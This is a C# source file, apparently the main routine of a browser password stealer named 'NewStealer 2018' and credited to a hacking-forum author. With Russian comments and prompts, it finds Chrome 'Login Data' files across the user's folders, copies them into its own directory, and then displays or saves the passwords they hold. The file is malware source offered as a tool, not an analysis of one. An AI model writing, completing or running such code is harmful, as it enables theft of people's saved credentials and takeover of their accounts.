namespace NewStealer2018
{
    using System;

    internal static partial class Program
    {
        private static bool True = true, False = false;
        private static void Main()
        {
            Console.Title = "NewStealer 2018 | All Chrome Engine | by Antlion [XakFor.Net]";
            HomeDirectory.Create(GetDirPath.User_Name, True);
            Console.Write("Ожидайте идёт сбор данных...");

            SearchLogin.CheckList("Login Data"); // Поиск Login Data во всех папках пользователя.
            SearchLogin.CopyLoginsInSafeDir("Logins"); // копируем все найденные файлы Login Data в нашу папку через цикл
            Console.Clear();

            Console.WriteLine("Выберите пункт: (View - Показать пароли | Save - Сохранить пароли).");
            switch (Console.ReadLine())
            {
                case "View":
                    Console.Clear();
                    GetEnginePassword.FindAllPassword(False);
                    Console.ReadLine();
                    break;
                case "Save":
                    GetEnginePassword.FindAllPassword(True);
                    Console.WriteLine($"Пароли сохранены в: {GetDirPath.Pass_File} ");

                    Console.ReadLine();
                    break;
                default:
                    Console.WriteLine("Неизвестная команда!");
                    Console.ReadLine();
                    break;
            }
            Console.Clear();
            Main();
        }
    }
}